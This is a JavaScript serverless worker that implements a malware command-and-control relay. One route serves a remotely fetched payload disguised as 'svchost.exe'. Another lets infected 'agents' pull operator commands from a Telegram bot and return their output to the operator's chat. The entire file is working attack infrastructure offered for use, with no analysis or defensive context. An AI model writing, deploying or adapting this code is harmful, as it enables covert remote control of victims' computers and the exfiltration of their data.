export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    
    // --- SECRET CONFIGURATION (HIDDEN FROM AGENT) ---
    const tgToken = env.TG_TOKEN; 
    const adminChatId = env.ADMIN_CHAT_ID;
    const payloadUrl = env.PAYLOAD_URL; 
    // ------------------------------------------------

    // ROUTE 1: Download Payload (For HID/Manual Download)
    if (url.pathname === '/download') {
      try {
        const response = await fetch(payloadUrl);
        if (!response.ok) throw new Error('Payload fetch failed');
        
        return new Response(await response.arrayBuffer(), {
          headers: {
            'Content-Type': 'application/octet-stream',
            'Content-Disposition': 'attachment; filename="svchost.exe"'
          }
        });
      } catch (e) {
        return new Response('Error downloading payload', { status: 500 });
      }
    }

    // ROUTE 2: Command & Control Proxy
    if (url.pathname === '/c2') {
      if (request.method === 'POST') {
        try {
          const body = await request.json();
          
          if (body.action === 'get_commands') {
            // Poll Telegram for updates
            const tgUrl = `https://api.telegram.org/bot${tgToken}/getUpdates?offset=${body.offset || -1}`;
            const tgResponse = await fetch(tgUrl);
            const data = await tgResponse.json();
            
            // Filter only messages from the Admin
            const relevantUpdates = data.result.filter(update => 
              update.message && 
              update.message.chat.id.toString() === adminChatId
            );
            
            const nextOffset = data.result.length > 0 
              ? data.result[data.result.length - 1].update_id + 1 
              : body.offset;

            return new Response(JSON.stringify({
              updates: relevantUpdates,
              next_offset: nextOffset
            }), {
              headers: { 'Content-Type': 'application/json' }
            });

          } else if (body.action === 'send_result') {
            // Send result back to Telegram
            const tgUrl = `https://api.telegram.org/bot${tgToken}/sendMessage`;
            const msgBody = {
              chat_id: adminChatId,
              text: `Agent ${body.agent_id} says:\n\n${body.output}`
            };
            
            await fetch(tgUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(msgBody)
            });
            
            return new Response(JSON.stringify({ success: true }));
          }
        } catch (e) {
          return new Response(JSON.stringify({ error: e.message }), { status: 500 });
        }
      }
    }

    return new Response('C2 Worker Active', { status: 200 });
  }
};
